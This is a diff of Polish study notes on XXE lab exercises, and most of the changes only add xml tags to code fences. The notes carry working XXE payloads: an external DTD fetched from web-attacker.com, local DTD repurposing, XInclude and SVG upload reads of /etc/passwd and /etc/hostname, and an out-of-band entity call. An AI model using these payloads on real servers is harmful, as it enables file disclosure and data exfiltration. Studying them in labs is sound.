@@ -77,7 +77,7 @@ Jak to działa (chyba)?
 - tworzy referencję do zmiennej (% eval), która dynamicznie tworzy zapytanie do nieistniejącego pliku (którego nazwą jest zawartość pliku /etc/passwd)
 - w "podmiocie" (entity) stworzonym przez wywołanie %eval; tworzymy referencję do zmiennej (%error), która zwróci błąd ponieważ ścieżka nie istnieje
 2. na serwerze dodajemy część kodu z zapytaniem:
-```
+```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
 3. serwer wysyła zapytanie i zwracany jest błąd z nazwą ścieżki, która nie istnieje (bo jest to zawartość pliku /etc/passwd)
@@ -86,7 +86,7 @@ notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są ent
 
 ## Lab: Exploiting XXE to retrieve data by repurposing a local DTD
 1. poprzez zapytania w typowe miejsca z pikami dtd (Document Type Definition) tj.:
-``` 
+```xml
 <!DOCTYPE foo [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 %local_dtd;
@@ -95,7 +95,7 @@ notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są ent
 2. jeśli plik nie istnieje zwracany jest błąd
 3. dowiadujemy się, że w pliku zdefiniowana jest zmienna ISOamso, bo pliki dtd zazwyczaj są opensource
 4. widząc to robimy payload:
-```
+```xml
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
@@ -119,7 +119,7 @@ notatka: zablokowane zą zewnętrzne zapytania oraz tworzenie entity poza serwer
 1. jest to przypadek, że nie mamy dostępu do całego dokumentu XML, a jedynie podajemy parametry do niego
 2. należy użyć wtedy `XInclude`, który pozwala na budowanie dokumentów XML, z sub-dokumentów
 3. Zamiast parametru podajemy zatem payload (zakodowany URL, zeby mógł być argumentm):
-```
+```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 4. Wtedy dosatemy informację: [Invalid product ID: zawartość /etc/passwd]
@@ -127,8 +127,18 @@ notatka: zablokowane zą zewnętrzne zapytania oraz tworzenie entity poza serwer
 
 ## Lab: Exploiting XXE via image file upload
 XML w obrazie SVG:
-```
+```xml
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+## Lab: Blind XXE with out-of-band interaction
+XXE zapytanie do domeny:
+```
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+
+&xxe;
+
 ```
 # XXS
 
